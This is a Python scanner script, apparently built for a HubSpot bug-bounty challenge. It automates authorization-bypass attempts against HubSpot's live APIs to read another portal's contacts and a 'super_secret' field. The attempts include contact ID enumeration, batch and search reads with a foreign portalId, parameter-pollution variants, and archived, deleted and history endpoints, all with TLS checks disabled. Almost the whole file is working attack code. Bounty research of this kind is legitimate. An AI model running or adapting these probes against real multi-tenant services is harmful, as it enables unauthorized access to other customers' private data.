#!/usr/bin/env python3
"""
HubSpot CTF Automated Scanner
Systematically tests all attack vectors for the $15,000 bounty
"""

import requests
import json
import time
import sys
from typing import Dict, List, Tuple
from datetime import datetime
import concurrent.futures
import urllib3

# Import config
try:
    from config import get_api_key, has_credentials, HUBSPOT_COOKIES
except ImportError:
    print("Error: config.py not found. Make sure you're running from the scripts directory.")
    sys.exit(1)

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

class HubSpotCTFScanner:
    def __init__(self, api_key: str, session_cookies: str = None):
        self.api_key = api_key
        self.session_cookies = session_cookies
        self.target_portal = "46962361"
        self.target_contact = "1"
        self.properties = ["firstname", "super_secret", "email"]

        self.results = {
            'total_tests': 0,
            'forbidden': 0,
            'not_found': 0,
            'errors': 0,
            'interesting': []
        }

        # API client
        self.api_session = requests.Session()
        self.api_session.headers.update({
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json',
            'User-Agent': 'HubSpot-CTF-Scanner/1.0'
        })

        # App domain client (session-based)
        self.app_session = requests.Session()
        if session_cookies:
            self.app_session.headers.update({
                'Cookie': session_cookies,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })

    def log(self, message: str, color: str = ''):
        """Log with timestamp and color"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {color}{message}{Colors.END}")

    def test_endpoint(self, method: str, url: str, session: requests.Session,
                     body: dict = None, description: str = "") -> Dict:
        """Test a single endpoint and return results"""
        self.results['total_tests'] += 1

        try:
            if method == 'GET':
                response = session.get(url, timeout=15, verify=False)
            elif method == 'POST':
                response = session.post(url, json=body, timeout=15, verify=False)
            elif method == 'PUT':
                response = session.put(url, json=body, timeout=15, verify=False)
            else:
                return {'error': 'Invalid method'}

            result = {
                'url': url,
                'method': method,
                'status': response.status_code,
                'length': len(response.text),
                'description': description,
                'headers': dict(response.headers),
                'response_snippet': response.text[:500]
            }

            # Categorize response
            if response.status_code == 403:
                self.results['forbidden'] += 1
                self.log(f"[-] 403: {description}", Colors.RED)
            elif response.status_code == 404:
                self.results['not_found'] += 1
                self.log(f"[-] 404: {description}", Colors.YELLOW)
            elif response.status_code == 200:
                self.log(f"{Colors.BOLD}[!!!] 200 SUCCESS: {description}{Colors.END}", Colors.GREEN)
                self.results['interesting'].append(result)
                # Try to extract flags
                try:
                    data = response.json()
                    if 'properties' in data:
                        self.log(f"{Colors.BOLD}POTENTIAL FLAGS FOUND:{Colors.END}", Colors.PURPLE)
                        for prop in self.properties:
                            if prop in data['properties']:
                                value = data['properties'][prop].get('value', data['properties'][prop])
                                self.log(f"  {prop} = {value}", Colors.PURPLE)
                except:
                    pass
            else:
                self.log(f"[?] {response.status_code}: {description} (len: {len(response.text)})", Colors.CYAN)
                if response.status_code not in [401, 429]:
                    self.results['interesting'].append(result)

            return result

        except Exception as e:
            self.results['errors'] += 1
            self.log(f"[!] Error: {description} - {str(e)}", Colors.RED)
            return {'error': str(e), 'description': description}

    def test_direct_access(self):
        """Test direct contact access via all API versions"""
        self.log("\n=== PHASE 1: Direct Contact Access ===", Colors.BOLD)

        contact_ids = [1, 2, 3, 4, 5, 10, 50, 100]  # Test multiple IDs

        endpoints = [
            ('GET', f'https://api.hubapi.com/crm/v3/objects/contacts/{{id}}?portalId={self.target_portal}&properties=firstname,super_secret,email', 'CRM v3'),
            ('GET', f'https://api.hubapi.com/contacts/v1/contact/vid/{{id}}/profile?portalId={self.target_portal}', 'Contacts v1'),
            ('GET', f'https://api.hubapi.com/contacts/v2/contacts/{{id}}?portalId={self.target_portal}', 'Contacts v2'),
            ('GET', f'https://api.hubapi.com/crm-objects/v1/objects/contacts/{{id}}?portalId={self.target_portal}', 'CRM Objects v1'),
            ('GET', f'https://app.hubspot.com/api/inbounddb-objects/v1/crm-objects/0-1/{{id}}?portalId={self.target_portal}&includeAllValues=true', 'Inbounddb-objects'),
        ]

        for contact_id in contact_ids:
            for method, url_template, desc in endpoints:
                url = url_template.format(id=contact_id)
                session = self.app_session if 'app.hubspot.com' in url else self.api_session
                self.test_endpoint(method, url, session, description=f"{desc} - Contact {contact_id}")
                time.sleep(0.1)  # Rate limiting

    def test_batch_operations(self):
        """Test batch read operations - HIGH PRIORITY"""
        self.log("\n=== PHASE 2: Batch Operations (HIGH PRIORITY) ===", Colors.BOLD)

        test_cases = [
            # Standard batch read
            {
                'url': f'https://api.hubapi.com/crm/v3/objects/contacts/batch/read?portalId={self.target_portal}',
                'body': {
                    'properties': self.properties,
                    'inputs': [{'id': '1'}, {'id': '2'}, {'id': '3'}]
                },
                'desc': 'Standard batch read'
            },
            # Portal ID in body
            {
                'url': 'https://api.hubapi.com/crm/v3/objects/contacts/batch/read',
                'body': {
                    'properties': self.properties,
                    'inputs': [{'id': '1'}],
                    'portalId': self.target_portal
                },
                'desc': 'Portal ID in body'
            },
            # Portal ID in both places
            {
                'url': 'https://api.hubapi.com/crm/v3/objects/contacts/batch/read?portalId=YOUR_PORTAL',
                'body': {
                    'properties': self.properties,
                    'inputs': [{'id': '1'}],
                    'portalId': self.target_portal
                },
                'desc': 'Portal ID pollution (query + body)'
            },
            # Via app domain
            {
                'url': 'https://app.hubspot.com/api/crm/v3/objects/contacts/batch/read',
                'body': {
                    'properties': self.properties,
                    'inputs': [{'id': '1'}],
                    'portalId': self.target_portal
                },
                'desc': 'Batch via app domain (session auth)'
            },
            # With propertiesWithHistory
            {
                'url': f'https://api.hubapi.com/crm/v3/objects/contacts/batch/read?portalId={self.target_portal}',
                'body': {
                    'properties': self.properties,
                    'propertiesWithHistory': ['firstname', 'super_secret'],
                    'inputs': [{'id': '1'}]
                },
                'desc': 'Batch with property history'
            },
        ]

        for test in test_cases:
            session = self.app_session if 'app.hubspot.com' in test['url'] else self.api_session
            self.test_endpoint('POST', test['url'], session, test['body'], test['desc'])
            time.sleep(0.2)

    def test_search_endpoints(self):
        """Test search and filter endpoints - CRITICAL"""
        self.log("\n=== PHASE 3: Search Endpoints (CRITICAL) ===", Colors.BOLD)

        test_cases = [
            # Basic search
            {
                'url': f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={self.target_portal}',
                'body': {
                    'filterGroups': [{
                        'filters': [{
                            'propertyName': 'createdate',
                            'operator': 'GT',
                            'value': '0'
                        }]
                    }],
                    'properties': self.properties,
                    'limit': 100
                },
                'desc': 'Search with date filter'
            },
            # Search by object ID
            {
                'url': f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={self.target_portal}',
                'body': {
                    'filterGroups': [{
                        'filters': [{
                            'propertyName': 'hs_object_id',
                            'operator': 'EQ',
                            'value': '1'
                        }]
                    }],
                    'properties': self.properties,
                    'limit': 10
                },
                'desc': 'Search for specific contact ID'
            },
            # Portal ID in body
            {
                'url': 'https://api.hubapi.com/crm/v3/objects/contacts/search',
                'body': {
                    'filterGroups': [{
                        'filters': [{
                            'propertyName': 'hs_object_id',
                            'operator': 'EQ',
                            'value': '1'
                        }]
                    }],
                    'properties': self.properties,
                    'portalId': self.target_portal,
                    'limit': 10
                },
                'desc': 'Search with portal ID in body'
            },
            # Via app domain
            {
                'url': 'https://app.hubspot.com/api/crm/v3/objects/contacts/search',
                'body': {
                    'filterGroups': [{
                        'filters': [{
                            'propertyName': 'hs_object_id',
                            'operator': 'EQ',
                            'value': '1'
                        }]
                    }],
                    'properties': self.properties,
                    'portalId': self.target_portal,
                    'limit': 10
                },
                'desc': 'Search via app domain (session)'
            },
            # Empty filters (get all)
            {
                'url': f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={self.target_portal}',
                'body': {
                    'filterGroups': [],
                    'properties': self.properties,
                    'limit': 100
                },
                'desc': 'Search with empty filters'
            },
        ]

        for test in test_cases:
            session = self.app_session if 'app.hubspot.com' in test['url'] else self.api_session
            self.test_endpoint('POST', test['url'], session, test['body'], test['desc'])
            time.sleep(0.2)

    def test_parameter_pollution(self):
        """Test parameter pollution attacks"""
        self.log("\n=== PHASE 4: Parameter Pollution ===", Colors.BOLD)

        base_path = f'/crm/v3/objects/contacts/1'
        params = 'properties=firstname,super_secret,email'

        test_cases = [
            ('Duplicate portalId', f'{base_path}?portalId=YOURS&portalId={self.target_portal}&{params}'),
            ('Array notation', f'{base_path}?portalId[]={self.target_portal}&{params}'),
            ('Capital P', f'{base_path}?PortalId={self.target_portal}&{params}'),
            ('All caps', f'{base_path}?PORTALID={self.target_portal}&{params}'),
            ('Underscore', f'{base_path}?portal_id={self.target_portal}&{params}'),
            ('hubId', f'{base_path}?hubId={self.target_portal}&{params}'),
            ('accountId', f'{base_path}?accountId={self.target_portal}&{params}'),
            ('Portal in path', f'/crm/v3/portals/{self.target_portal}/objects/contacts/1?{params}'),
        ]

        for desc, path in test_cases:
            url = f'https://api.hubapi.com{path}'
            self.test_endpoint('GET', url, self.api_session, description=f'Pollution: {desc}')
            time.sleep(0.1)

    def test_property_access(self):
        """Test property-specific access"""
        self.log("\n=== PHASE 5: Property Access ===", Colors.BOLD)

        endpoints = [
            ('GET', f'https://api.hubapi.com/properties/v1/contacts/properties/named/super_secret?portalId={self.target_portal}', 'Property definition'),
            ('GET', f'https://api.hubapi.com/properties/v1/contacts/properties?portalId={self.target_portal}', 'All properties'),
            ('GET', f'https://api.hubapi.com/crm/v3/properties/contacts?portalId={self.target_portal}', 'CRM v3 properties'),
            ('GET', f'https://api.hubapi.com/contacts/v1/contact/vid/1/property/super_secret/history?portalId={self.target_portal}', 'Property history'),
        ]

        for method, url, desc in endpoints:
            self.test_endpoint(method, url, self.api_session, description=desc)
            time.sleep(0.1)

    def test_edge_cases(self):
        """Test edge cases and unusual patterns"""
        self.log("\n=== PHASE 6: Edge Cases ===", Colors.BOLD)

        endpoints = [
            ('GET', f'https://api.hubapi.com/crm/v3/objects/contacts?portalId={self.target_portal}&archived=true&properties=firstname,super_secret,email&limit=100', 'Archived contacts'),
            ('GET', f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={self.target_portal}&includeDeleted=true&properties=firstname,super_secret,email', 'Include deleted'),
            ('GET', f'https://api.hubapi.com/engagements/v1/engagements/associated/contact/1/paged?portalId={self.target_portal}', 'Contact engagements'),
            ('GET', f'https://api.hubapi.com/contacts/v1/lists/all/contacts/1?portalId={self.target_portal}', 'Contact lists'),
        ]

        for method, url, desc in endpoints:
            self.test_endpoint(method, url, self.api_session, description=desc)
            time.sleep(0.1)

    def generate_report(self):
        """Generate final report"""
        self.log("\n" + "="*70, Colors.BOLD)
        self.log("SCAN COMPLETE - FINAL REPORT", Colors.BOLD)
        self.log("="*70, Colors.BOLD)

        self.log(f"\nTotal Tests: {self.results['total_tests']}", Colors.CYAN)
        self.log(f"403 Forbidden: {self.results['forbidden']}", Colors.RED)
        self.log(f"404 Not Found: {self.results['not_found']}", Colors.YELLOW)
        self.log(f"Errors: {self.results['errors']}", Colors.RED)
        self.log(f"Interesting Responses: {len(self.results['interesting'])}", Colors.GREEN)

        if self.results['interesting']:
            self.log(f"\n{Colors.BOLD}INTERESTING FINDINGS:{Colors.END}", Colors.PURPLE)
            for i, result in enumerate(self.results['interesting'], 1):
                self.log(f"\n[{i}] {result.get('description', 'Unknown')}", Colors.PURPLE)
                self.log(f"    URL: {result.get('url', 'N/A')}", Colors.CYAN)
                self.log(f"    Status: {result.get('status', 'N/A')}", Colors.GREEN)
                self.log(f"    Length: {result.get('length', 0)} bytes", Colors.CYAN)
                self.log(f"    Response: {result.get('response_snippet', '')[:200]}...", Colors.YELLOW)

        # Save to file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'/home/user/Hub/findings/scan_results_{timestamp}.json'
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        self.log(f"\nResults saved to: {filename}", Colors.GREEN)

    def run_all_tests(self):
        """Run all test phases"""
        self.log("="*70, Colors.BOLD)
        self.log("HubSpot CTF Automated Scanner - $15,000 Bounty Hunter", Colors.BOLD)
        self.log("Target Portal: 46962361", Colors.CYAN)
        self.log("="*70, Colors.BOLD)

        start_time = time.time()

        try:
            self.test_direct_access()
            self.test_batch_operations()
            self.test_search_endpoints()
            self.test_parameter_pollution()
            self.test_property_access()
            self.test_edge_cases()
        except KeyboardInterrupt:
            self.log("\n\nScan interrupted by user", Colors.YELLOW)

        elapsed = time.time() - start_time
        self.log(f"\nScan completed in {elapsed:.2f} seconds", Colors.CYAN)

        self.generate_report()


def main():
    print(f"{Colors.BOLD}HubSpot CTF Automated Scanner{Colors.END}")
    print(f"{Colors.CYAN}Target: Portal 46962361 - $15,000 Bounty{Colors.END}\n")

    # Try to load credentials from config
    if not has_credentials():
        print(f"{Colors.RED}Error: No credentials found in .env file{Colors.END}")
        print("Please configure your credentials in the .env file first.")
        sys.exit(1)

    api_key = get_api_key()
    print(f"{Colors.GREEN}[+] Loaded credentials from config{Colors.END}")
    print(f"[*] Using API key: {api_key[:20]}...\n")

    # Use cookies from config if available
    session_cookies = HUBSPOT_COOKIES if HUBSPOT_COOKIES else None
    if session_cookies:
        print(f"{Colors.GREEN}[+] Using session cookies from config{Colors.END}\n")

    print(f"{Colors.YELLOW}Starting scan...{Colors.END}\n")

    scanner = HubSpotCTFScanner(api_key, session_cookies)
    scanner.run_all_tests()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Scan terminated by user{Colors.END}")
        sys.exit(0)
